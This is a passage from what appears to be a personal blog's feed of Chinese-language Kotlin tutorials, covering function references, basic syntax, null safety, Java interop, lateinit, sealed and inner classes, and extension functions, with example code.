<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">    fun <span class="title function_">getSex</span><span class="params">()</span> = println(<span class="string">&quot;不男不女&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">getSex</span> <span class="operator">=</span> Car::getSex</span><br><span class="line">    <span class="title function_">getSex</span><span class="params">(Car()</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他要求必须传入一个实例进去。<br>但是在kotlin1.1后版本更新，允许进行<strong>绑定引用</strong>。<br>也就是直接引用来自实例的方法。<br>如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> kotlin.reflect.KFunction1</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">    fun <span class="title function_">getSex</span><span class="params">()</span> = println(<span class="string">&quot;不男不女&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">car</span> <span class="operator">=</span> Car()</span><br><span class="line">    <span class="type">var</span> <span class="variable">getSex</span> <span class="operator">=</span> car::getSex</span><br><span class="line">    <span class="title function_">getSex</span><span class="params">()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin基础：变量、函数、循环、集合</title>
    <url>/posts/3cd18efd/</url>
    <content><![CDATA[<h2 id="基础main函数"><a href="#基础main函数" class="headerlink" title="基础main函数"></a>基础main函数</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    println(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>print，println输出到屏幕上。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>默认不填即为Unit。<br>when类似于switch，if else 只要有结果判定成功，便不再往下判断。<br>Unit标识无返回类型&#x3D;&gt;void<br>前变量名，后数据类型<br>使用${}作为占位符</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sampleStart</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">sum</span><span class="params">(a: <span class="type">Int</span>, b: <span class="type">Int</span>)</span></span>: <span class="built_in">Int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sampleEnd</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">sum</span><span class="params">(a: <span class="type">Int</span>, b: <span class="type">Int</span>)</span></span> = a + b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    println(<span class="string">&quot;sum of 19 and 23 is <span class="subst">$&#123;sum(<span class="number">19</span>, <span class="number">23</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    printSum(-<span class="number">11</span>,<span class="number">53</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">printSum</span><span class="params">(a: <span class="type">Int</span>, b: <span class="type">Int</span>)</span></span>: <span class="built_in">Unit</span> &#123;</span><br><span class="line">    println(<span class="string">&quot;sum of <span class="variable">$a</span> and <span class="variable">$b</span> is <span class="subst">$&#123;a + b&#125;</span>&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>如果有赋值，那么它可以自动推出变量类型，否则需要声明变量类型<br>val 只读变量，不可以修改<br>var 可读可改变量<br>const val 常量，必须定义在函数之外。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> a: <span class="built_in">Int</span> = <span class="number">1</span>  <span class="comment">// 立即赋值</span></span><br><span class="line">    <span class="keyword">val</span> b = <span class="number">2</span>   <span class="comment">// 自动推断出 `Int` 类型</span></span><br><span class="line">    <span class="keyword">val</span> c: <span class="built_in">Int</span>  <span class="comment">// 如果没有初始值类型不能省略</span></span><br><span class="line">    c = <span class="number">3</span>       <span class="comment">// 明确赋值</span></span><br></pre></td></tr></table></figure>
<h2 id="类与实例"><a href="#类与实例" class="headerlink" title="类与实例"></a>类与实例</h2><p>类的属性可以在声明或者主体中列出<br>要继承一个类，需要使用<code>:</code>,类一遍情况下都默认为final类型，所以要声明为open</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">Shape</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span>(<span class="keyword">var</span> height:<span class="built_in">Double</span>,<span class="keyword">var</span> length:<span class="built_in">Double</span>) : Shape()&#123;</span><br><span class="line">    <span class="keyword">var</span> perimeter = (height+length) * <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> rectangle = Rectangle(<span class="number">10.1</span>,<span class="number">20.0</span>)<span class="comment">//必须使用.0不然直接运行不了</span></span><br><span class="line">    println(rectangle.perimeter)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="单行多行注释"><a href="#单行多行注释" class="headerlink" title="单行多行注释"></a>单行多行注释</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这是一个行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这是一个多行的</span></span><br><span class="line"><span class="comment">   块注释。 */</span></span><br></pre></td></tr></table></figure>
<h2 id="字符串模板"><a href="#字符串模板" class="headerlink" title="字符串模板"></a>字符串模板</h2><p>用${a}来把变量a合并到字符串中。也可以简写为$a。<br>它可以使用模板es6的语法如下所示</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> price = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="subst">$&#123;<span class="string">&#x27;$&#x27;</span>&#125;</span>_9.99</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="条件表达式"><a href="#条件表达式" class="headerlink" title="条件表达式"></a>条件表达式</h2><p>if else （特殊：他本身也可以作为表达式来使用）</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m =  <span class="keyword">if</span> (a &gt; b) a <span class="keyword">else</span> b  &lt;=&gt;  m = a&gt;b ? a :b 三元表达式</span><br></pre></td></tr></table></figure>
<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">sampleStart</span><br><span class="line"><span class="keyword">var</span> items = listOf(<span class="string">&quot;apple&quot;</span>,<span class="string">&quot;banana&quot;</span>,<span class="string">&quot;xigua&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (item <span class="keyword">in</span> items)&#123;</span><br><span class="line">        println(item)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sampleEnd</span></span><br><span class="line"><span class="comment">//indices表示index</span></span><br><span class="line"><span class="comment">//indeces 表示的是一个集合类型，包括从(0...list.size-1)</span></span><br><span class="line"><span class="comment">//$&#123;items[index]&#125; = $&#123;items[item]&#125;</span></span><br><span class="line"><span class="keyword">for</span> (index <span class="keyword">in</span> items.indices) &#123;</span><br><span class="line">        println(<span class="string">&quot;item at <span class="variable">$index</span> is <span class="subst">$&#123;items[index]&#125;</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (index &lt; items.size)&#123;</span><br><span class="line">        println(<span class="string">&quot;item in <span class="variable">$index</span> is <span class="subst">$&#123;items[index]&#125;</span>&quot;</span>)</span><br><span class="line">        index++</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="when表达式switch-case但是他的可操作性更强，没有了固定的约束"><a href="#when表达式switch-case但是他的可操作性更强，没有了固定的约束" class="headerlink" title="when表达式&lt;&#x3D;&gt;switch case但是他的可操作性更强，没有了固定的约束"></a>when表达式&lt;&#x3D;&gt;switch case但是他的可操作性更强，没有了固定的约束</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">decsribe</span><span class="params">(obj:<span class="type">Any</span>)</span></span>:String = <span class="keyword">when</span>(obj) &#123;</span><br><span class="line">    <span class="number">1</span> -&gt; <span class="string">&quot;One&quot;</span></span><br><span class="line">    <span class="number">2</span> -&gt; <span class="string">&quot;Two&quot;</span></span><br><span class="line">    <span class="string">&quot;Hello&quot;</span>    -&gt; <span class="string">&quot;Greeting&quot;</span></span><br><span class="line">    <span class="keyword">is</span> <span class="built_in">Long</span>    -&gt; <span class="string">&quot;Long&quot;</span></span><br><span class="line">    !<span class="keyword">is</span> String -&gt; <span class="string">&quot;Not a string&quot;</span></span><br><span class="line">    <span class="keyword">else</span>       -&gt; <span class="string">&quot;Unknown&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="使用区间（range）"><a href="#使用区间（range）" class="headerlink" title="使用区间（range）"></a>使用区间（range）</h2><p>它满足前闭后闭</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用 in 操作符来检测某个数字是否在指定区间内</span></span><br><span class="line"> <span class="keyword">val</span> x = <span class="number">10</span></span><br><span class="line">    <span class="keyword">val</span> y = <span class="number">9</span></span><br><span class="line">    <span class="keyword">if</span>(x <span class="keyword">in</span> <span class="number">1.</span>.y+<span class="number">1</span>)&#123;</span><br><span class="line">        println(<span class="string">&quot;fits in range&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//最后可以正确输出结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检测某个数字是否在指定区间外。</span></span><br><span class="line">   <span class="keyword">val</span> list = listOf(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (-<span class="number">1</span> !<span class="keyword">in</span> <span class="number">0.</span>.list.lastIndex) &#123;</span><br><span class="line">        println(<span class="string">&quot;-1 is out of range&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (list.size !<span class="keyword">in</span> list.indices) &#123;</span><br><span class="line">        println(<span class="string">&quot;list size is out of valid list indices range, too&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//in也可用在for，while循环中区间迭代</span></span><br><span class="line"><span class="keyword">for</span> (x <span class="keyword">in</span> <span class="number">1.</span><span class="number">.5</span>) &#123;</span><br><span class="line">        print(x)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//或者数列迭代，并控制步进大小</span></span><br><span class="line"><span class="keyword">for</span>(x <span class="keyword">in</span> <span class="number">1.</span><span class="number">.5</span> step <span class="number">2</span>)&#123;</span><br><span class="line">        println(x)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(x <span class="keyword">in</span> <span class="number">10</span> downTo -<span class="number">3</span> step <span class="number">3</span>)&#123;</span><br><span class="line">        println(x)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>使用 in 操作符来判断集合内是否包含某实例。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> items = setOf(<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;kiwifruit&quot;</span>)</span><br><span class="line"><span class="comment">//sampleStart</span></span><br><span class="line">    <span class="keyword">when</span> &#123;</span><br><span class="line">        <span class="string">&quot;orange&quot;</span> <span class="keyword">in</span> items -&gt; println(<span class="string">&quot;juicy&quot;</span>)</span><br><span class="line">        <span class="string">&quot;apple&quot;</span> <span class="keyword">in</span> items -&gt; println(<span class="string">&quot;apple is fine too&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//sampleEnd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 lambda 表达式来过滤（filter）与映射（map）集合：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//sampleStart</span></span><br><span class="line">    <span class="keyword">val</span> fruits = listOf(<span class="string">&quot;banana&quot;</span>, <span class="string">&quot;avocado&quot;</span>, <span class="string">&quot;apple&quot;</span>, <span class="string">&quot;kiwifruit&quot;</span>)</span><br><span class="line">    fruits</span><br><span class="line">      .filter &#123; it.startsWith(<span class="string">&quot;a&quot;</span>) &#125;</span><br><span class="line">      .sortedBy &#123; it &#125;</span><br><span class="line">      .map &#123; it.uppercase() &#125;</span><br><span class="line">      .forEach &#123; println(it) &#125;</span><br><span class="line"><span class="comment">//sampleEnd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="空值和空检测"><a href="#空值和空检测" class="headerlink" title="空值和空检测"></a>空值和空检测</h2><p>当可能用 null 值时，必须将引用显式标记为可空。可空类型名称以问号（?）结尾。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">parseInt</span><span class="params">(str: <span class="type">String</span>)</span></span>: <span class="built_in">Int</span>? &#123;</span><br><span class="line">    <span class="keyword">return</span> str.toIntOrNull()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sampleStart</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">printProduct</span><span class="params">(arg1: <span class="type">String</span>, arg2: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> x = parseInt(arg1)</span><br><span class="line">    <span class="keyword">val</span> y = parseInt(arg2)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 直接使用 `x * y` 会导致编译错误，因为它们可能为 null</span></span><br><span class="line">    <span class="keyword">if</span> (x != <span class="literal">null</span> &amp;&amp; y != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 在空检测后，x 与 y 会自动转换为非空值（non-nullable）</span></span><br><span class="line">        println(x * y)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        println(<span class="string">&quot;&#x27;<span class="variable">$arg1</span>&#x27; or &#x27;<span class="variable">$arg2</span>&#x27; is not a number&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sampleEnd</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    printProduct(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>)</span><br><span class="line">    printProduct(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;7&quot;</span>)</span><br><span class="line">    printProduct(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="类型检测和自动类型转化"><a href="#类型检测和自动类型转化" class="headerlink" title="类型检测和自动类型转化"></a>类型检测和自动类型转化</h2><p>is 操作符检测一个表达式是否某类型的一个实例，当某个变量进行判断后，他会自动转换为这个类型，并作为该类型使用<br>即便是在判断的右侧他也会自动转化为对应的判断类型。<br>如下：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getStringLength</span><span class="params">(obj: <span class="type">Any</span>)</span></span>: <span class="built_in">Int</span>? &#123;</span><br><span class="line">  <span class="comment">// 在 `&amp;&amp;` 运算符的右侧, `obj` 的类型会被自动转换为 `String`</span></span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">is</span> String &amp;&amp; obj.length &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> obj.length</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sampleStart</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getStringLength</span><span class="params">(obj: <span class="type">Any</span>)</span></span>: <span class="built_in">Int</span>? &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">is</span> String) &#123;</span><br><span class="line">        <span class="comment">// `obj` 在该条件分支内自动转换成 `String`</span></span><br><span class="line">        <span class="keyword">return</span> obj.length</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在离开类型检测分支后，`obj` 仍然是 `Any` 类型</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sampleEnd</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">printLength</span><span class="params">(obj: <span class="type">Any</span>)</span></span> &#123;</span><br><span class="line">        println(<span class="string">&quot;Getting the length of &#x27;<span class="variable">$obj</span>&#x27;. Result: <span class="subst">$&#123;getStringLength(obj) ?: <span class="string">&quot;Error: The object is not a string&quot;</span>&#125;</span> &quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    printLength(<span class="string">&quot;Incomprehensibilities&quot;</span>)</span><br><span class="line">    printLength(<span class="number">1000</span>)</span><br><span class="line">    printLength(listOf(Any()))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin和Java互操作限制与解决方案</title>
    <url>/posts/60ffe3d5/</url>
    <content><![CDATA[<h2 id="正常情况下，kotlin做为优化后的java他们两是可以做到相互操作的。而且可以没有任何第三方库加持。"><a href="#正常情况下，kotlin做为优化后的java他们两是可以做到相互操作的。而且可以没有任何第三方库加持。" class="headerlink" title="正常情况下，kotlin做为优化后的java他们两是可以做到相互操作的。而且可以没有任何第三方库加持。"></a>正常情况下，kotlin做为优化后的java他们两是可以做到相互操作的。而且可以没有任何第三方库加持。</h2><p>而在某些时候会发现他们不能一起使用。会报以下错误</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.NoClassDefFoundError: entity/SSchool</span><br><span class="line">	at MainKt.<span class="built_in">test</span>(Main.kt:19)</span><br><span class="line">	at MainKt.main(Main.kt:16)</span><br><span class="line">Caused by: java.lang.ClassNotFoundException: entity.SSchool</span><br><span class="line">	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:641)</span><br><span class="line">	at java.base/jdk.internal.loader.ClassLoaders<span class="variable">$AppClassLoader</span>.loadClass(ClassLoaders.java:188)</span><br><span class="line">	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:520)</span><br><span class="line">	... 2 more</span><br></pre></td></tr></table></figure>
<p>下图是目录结构<br><img src="https://memos.zfxt.top/o/r/49/75c903d2-9619-4e28-ad0d-55a3af9d1df2/1685723138_image.png" alt="image"><br>解决办法就是，在main下在建立一个java的目录，这样子，把java的类移植过来，此时，他们公用一个resource。再把entity移植过去，此时，他们就可以正常使用了。<br><img src="https://memos.zfxt.top/o/r/50/ac04cc9a-995e-4e38-ad94-b05e7f206b35/1685723398_image.png" alt="image"></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin委托机制概述</title>
    <url>/posts/a685112b/</url>
    <content><![CDATA[<h2 id="kotlin委托机制"><a href="#kotlin委托机制" class="headerlink" title="kotlin委托机制"></a>kotlin委托机制</h2><p>就我目前遇到的问题时，该知识点并不需要我太关心，因此挂一个链接在这<br><a href="https://juejin.cn/post/6958346113552220173#heading-15">掘金</a></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin延迟初始化和密封类，内部类</title>
    <url>/posts/c2dfd577/</url>
    <content><![CDATA[<h2 id="延迟初始类"><a href="#延迟初始类" class="headerlink" title="延迟初始类"></a>延迟初始类</h2><blockquote>
<p>这个应用的前提：很多情况下，我们会先初始化一个类，但是因为没有给他赋值，就给他赋值为null。如:</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">var</span> adapter: MsgAdapter? = <span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>而在kotlin中，对于可能为空的变量，需要进行很多次非空判断，非空保护，即便你知道他不可能为空。以满足他的语法规则。</p>
<h3 id="延迟初始化"><a href="#延迟初始化" class="headerlink" title="延迟初始化"></a>延迟初始化</h3><p>然后这里提供一种方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> lateinit <span class="keyword">var</span> adapter: MsgAdapter</span><br></pre></td></tr></table></figure>
<p><code>lateinit</code>这个关键字表明当前这个变量不会立刻初始化，而是会在后面的步骤中赋值。但是他也有一个问题，如果你在使用这个变量时，没有赋值，他会抛出没有初始化的异常<code>UninitializedPropertyAccessException</code>。解决这个问题的方法就是在给他初始化的时候加一个判断是否初始化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!::adapter.isInitialized) &#123;</span><br><span class="line"> adapter = MsgAdapter(msgList)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p> 这是一个固定的语法规则，能判断是否完成初始化。</p>
<h2 id="密封类"><a href="#密封类" class="headerlink" title="密封类"></a>密封类</h2><p>密封类的关键字是<code>sealed class</code>,使用它可以构建一个密封类。<br>使用场景：在kotlin中，当你使用when函数时，总是需要else判断条件的。有时候你已经把可以枚举的可能性都枚举完后任然需要else。通常我们的做法是抛出一个异常使其编译通过。<br>比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title class_">Result</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Success</span>(val msg: String) : Result()</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Failure</span>(val error: Exception) : Result()</span><br><span class="line">···</span><br><span class="line">fun <span class="title function_">getResultMsg</span><span class="params">(result: Result)</span> = <span class="keyword">when</span> (result) &#123;</span><br><span class="line"> is Success -&gt; result.msg</span><br><span class="line"> is Failure -&gt; <span class="string">&quot;Error is $&#123;result.error.message&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
<p>如果我们使用了密封类的话，我们就必须在这种when的情况下，把所有的条件枚举出来，不然会语法报错。他的作用就是减少了出错的可能性，同时这里也不用写else了。</p>
<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>区分：<br>内部类和嵌套类，简单点就是内部类可以作为一个类的内部成员，可以引用到外部类，也就是这个整体。但是嵌套类不可以。<br><strong>默认不加inner</strong>就是嵌套类</p>
<table>
<thead>
<tr>
<th align="left">类A在类B中的声明</th>
<th align="left">在java中</th>
<th align="left">在kotlin中</th>
</tr>
</thead>
<tbody><tr>
<td align="left">嵌套类（不存储外部类的引用）</td>
<td align="left">static class A</td>
<td align="left">class A</td>
</tr>
<tr>
<td align="left">内部类（存储外部类的引用)</td>
<td align="left">class A</td>
<td align="left">inner class A</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin扩展：新增方法，修改属性</title>
    <url>/posts/2ddd2429/</url>
    <content><![CDATA[<h1 id="kotlin扩展"><a href="#kotlin扩展" class="headerlink" title="kotlin扩展"></a>kotlin扩展</h1><p>扩展函数，它可以在已有类中添加新方法，而不对原类做出修改。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> receiverType.<span class="title">functionName</span><span class="params">(params)</span></span>&#123;</span><br><span class="line">    body</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="keyword">var</span> name:String)</span><br><span class="line">- receiverType：表示函数的接收者，也就是函数扩展的对象</span><br><span class="line">- functionName：扩展函数的名称</span><br><span class="line">- params：扩展函数的参数，可以为NULL</span><br><span class="line"><span class="comment">/**扩展函数**/</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> User.<span class="title">Print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    print(<span class="string">&quot;用户名 <span class="variable">$name</span>&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(arg:<span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> user = User(<span class="string">&quot;Runoob&quot;</span>)</span><br><span class="line">    user.Print()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="扩展函数是静态解析的。"><a href="#扩展函数是静态解析的。" class="headerlink" title="扩展函数是静态解析的。"></a>扩展函数是静态解析的。</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.zfxt</span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">a</span>&#123;</span><br><span class="line">    <span class="keyword">open</span> <span class="function"><span class="keyword">fun</span> <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;我是a的函数&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:<span class="type">a</span>()&#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        println(<span class="string">&quot;我是b的函数&quot;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">printout</span><span class="params">(a:<span class="type">a</span>)</span></span>&#123;</span><br><span class="line">    println(a.<span class="keyword">out</span>())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//扩展函数</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> a.<span class="title">foo</span><span class="params">()</span></span>=<span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> b.<span class="title">foo</span><span class="params">()</span></span>=<span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="comment">//写一个函数来判断扩展函数是否也满足动态绑定。</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">printfoo</span><span class="params">(a:<span class="type">a</span>)</span></span>&#123;</span><br><span class="line">    println(a.foo())</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> user:a = b()</span><br><span class="line">    <span class="comment">//第一个user表明，他任然是满足动态绑定的。可以实现java中所理解的动态绑定。</span></span><br><span class="line">    user.<span class="keyword">out</span>()</span><br><span class="line">    <span class="comment">//第二个函数中也与上一个一致</span></span><br><span class="line">    printout(b())</span><br><span class="line">    <span class="comment">//第三个函数用来判断扩展函数是否满足动态绑定</span></span><br><span class="line">    printfoo(b())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果展示</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">我是b的函数</span><br><span class="line">我是b的函数</span><br><span class="line">kotlin.<span class="built_in">Unit</span></span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p>如果函数没有继承，那么两个父子类他们都具有同名的函数，此时，会根据传递进去时要求的参数类型判断是执行什么函数。</p>
